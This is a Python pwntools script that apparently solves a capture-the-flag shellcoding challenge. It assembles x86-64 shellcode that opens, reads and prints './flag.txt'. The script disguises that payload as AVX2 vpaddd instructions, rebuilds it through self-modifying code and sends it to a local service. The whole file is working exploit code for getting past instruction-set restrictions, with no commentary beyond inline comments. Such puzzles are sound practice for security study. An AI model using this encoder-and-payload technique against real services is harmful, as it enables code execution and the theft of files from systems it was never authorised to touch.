from pwn import *
from base64 import b64encode

def challenge(code):
    code = b64encode(code).decode()
    p = remote("localhost", 35123)
    p.sendline(code)
    p.interactive()


asmcode = """
    vpxor ymm0, ymm0, ymm0                  # Zero ymm0 for use as base
    vpaddd ymm1, ymm0, YMMWORD PTR [rip + stage2 + 4] # To get the byte '1'
    vpslld ymm1, ymm1, 31                   # to get 0x80000000
INSTRUCTIONS

stage2: # the vpaddd exists to get the byte '1', and also as padding
    vpaddd ymm3, ymm3, YMMWORD PTR [rip + 1] # To hold the byte '1'

stage2_bytes:
STAGE2_BYTES
"""

# Second stage shellcode
shellcode = asm("""
    push rbp
    mov rbp, rsp
    sub rsp, 0x100
    
    lea rdi, [rip + flag_path]
    xor esi, esi  # O_RDONLY
    xor edx, edx  # mode
    mov eax, 2    # sys_open
    syscall
    
    mov rdi, rax  # fd
    lea rsi, [rsp]  # buffer
    mov edx, 0x100  # size
    xor eax, eax  # sys_read
    syscall
    
    mov edi, 1    # stdout
    lea rsi, [rsp]  # buffer
    mov edx, eax  # size
    mov eax, 1    # sys_write
    syscall
    
    mov eax, 3    # sys_close
    syscall
    
    mov eax, 60   # sys_exit
    xor edi, edi  # exit code 0
    syscall

flag_path:
    .string "./flag.txt"
""", arch='amd64')

# Now encode the shellcode as AVX2 operations
writeinstrs = []
datainstrs = []
for i in range(0, len(shellcode), 4):
    chunk = u32(shellcode[i:i+4].ljust(4, b'\x90'))
    
    # c5 fd fe 80 <chunk bytes> 
    chunkshort = chunk & 0x7fffffff # must be signed 32-bit
    datainstr = f"\tvpaddd ymm0, ymm0, YMMWORD PTR [rip + 0x{chunkshort:x}]"

    writeinstr = ""
    if (chunk >> 31) == 1:
        writeinstr += f"\tvpaddd ymm2, ymm1, [rip + stage2_bytes + 4 + {2 * i}]"
    else:
        writeinstr += f"\tvpaddd ymm2, ymm0, [rip + stage2_bytes + 4 + {2 * i}]"
    
    writeinstr += f"\n\tvextracti128 [rip + stage2 + {i}], ymm2, 0"
    
    writeinstrs.append(writeinstr)
    datainstrs.append(datainstr)

asmcode = asmcode.replace("INSTRUCTIONS", "\n".join(writeinstrs))
asmcode = asmcode.replace("STAGE2_BYTES", "\n".join(datainstrs))

print(asmcode)
code = asm(asmcode, arch='amd64')
print(len(code))
challenge(code)